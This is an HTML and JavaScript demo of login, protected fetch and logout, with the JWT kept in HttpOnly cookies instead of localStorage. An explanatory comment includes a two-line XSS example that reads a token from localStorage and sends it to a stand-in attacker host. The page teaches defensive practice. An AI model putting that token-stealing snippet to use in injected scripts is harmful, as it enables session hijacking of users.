<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Auth Demo</title>
</head>
<body>
<h1>Authentication Demo</h1>
<form id="loginForm">
  <input type="text" id="username" placeholder="Username" required>
  <input type="password" id="password" placeholder="Password" required>
  <button type="submit">Log In</button>
</form>
<button id="fetchProfileBtn">Fetch Protected Profile</button>
<button id="logoutBtn">Log Out</button>
<pre id="output"></pre>

<script>
/*
 * ==========================================================================
 * WHY WE DO NOT STORE JWTs IN localStorage OR sessionStorage
 * ==========================================================================
 *
 * localStorage and sessionStorage are accessible to ANY JavaScript running
 * on the page via `localStorage.getItem(...)`. This makes them vulnerable
 * to Cross-Site Scripting (XSS) attacks:
 *
 *   - If an attacker manages to inject malicious JavaScript (e.g. through an
 *     unsanitized input, a compromised third-party script, or a vulnerable
 *     dependency), that script can simply read the token:
 *
 *         const stolen = localStorage.getItem('jwt');
 *         fetch('https://evil.example/steal?t=' + stolen);
 *
 *   - The stolen token can then be used to impersonate the user from
 *     anywhere until it expires. There is no browser-level protection.
 *
 * THE SAFER APPROACH: HttpOnly cookies
 * ------------------------------------
 *   - The server sets the JWT in a cookie with the flags:
 *         Set-Cookie: token=<jwt>; HttpOnly; Secure; SameSite=Strict; Path=/
 *
 *   - HttpOnly means JavaScript CANNOT read the cookie (document.cookie
 *     won't expose it), so injected XSS scripts cannot exfiltrate it.
 *   - Secure ensures it is only sent over HTTPS.
 *   - SameSite=Strict (or Lax) mitigates CSRF by preventing the cookie from
 *     being sent on cross-site requests. (For full CSRF protection you should
 *     also use anti-CSRF tokens for state-changing requests.)
 *
 *   - The browser automatically attaches the cookie to requests to the same
 *     origin, so our client code never has to touch the token at all. We just
 *     need to tell fetch to include credentials.
 * ==========================================================================
 */

const output = document.getElementById('output');

function log(msg) {
  output.textContent += msg + '\n';
}

/**
 * Handles login. The server responds by setting an HttpOnly cookie
 * containing the JWT. We never receive or store the token in JS.
 */
async function login(username, password) {
  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      // `credentials: 'include'` tells the browser to accept and store
      // cookies set by the server (and send existing cookies). This is
      // what allows the server's Set-Cookie (HttpOnly) response to take effect.
      credentials: 'include',
      body: JSON.stringify({ username, password })
    });

    if (!response.ok) {
      throw new Error('Login failed with status ' + response.status);
    }

    // NOTE: We do NOT read a token here. The token lives only in the
    // HttpOnly cookie. The response body may just contain non-sensitive
    // user info (display name, roles, etc.).
    const data = await response.json().catch(() => ({}));
    log('Login successful. User: ' + (data.username || username));
    return data;
  } catch (err) {
    log('Login error: ' + err.message);
    throw err;
  }
}

/**
 * Makes an authenticated request to a protected endpoint.
 * Because we use `credentials: 'include'`, the browser automatically
 * attaches the HttpOnly cookie — our JS never handles the JWT directly.
 */
async function fetchProtected(url) {
  try {
    const response = await fetch(url, {
      method: 'GET',
      credentials: 'include', // browser sends the HttpOnly auth cookie
      headers: { 'Accept': 'application/json' }
    });

    if (response.status === 401) {
      log('Not authenticated (401). Please log in again.');
      return null;
    }
    if (!response.ok) {
      throw new Error('Request failed with status ' + response.status);
    }

    const data = await response.json();
    log('Protected data: ' + JSON.stringify(data));
    return data;
  } catch (err) {
    log('Fetch error: ' + err.message);
    throw err;
  }
}

/**
 * Logout tells the server to clear the cookie (Set-Cookie with an
 * expired date / Max-Age=0). We cannot delete an HttpOnly cookie from
 * JS, which is by design — only the server can invalidate it.
 */
async function logout() {
  try {
    await fetch('/api/logout', {
      method: 'POST',
      credentials: 'include'
    });
    log('Logged out (server cleared the auth cookie).');
  } catch (err) {
    log('Logout error: ' + err.message);
  }
}

// Wire up the UI
document.getElementById('loginForm').addEventListener('submit', function (e) {
  e.preventDefault();
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  login(username, password);
});

document.getElementById('fetchProfileBtn').addEventListener('click', function () {
  fetchProtected('/api/profile');
});

document.getElementById('logoutBtn').addEventListener('click', function () {
  logout();
});
</script>
</body>
</html>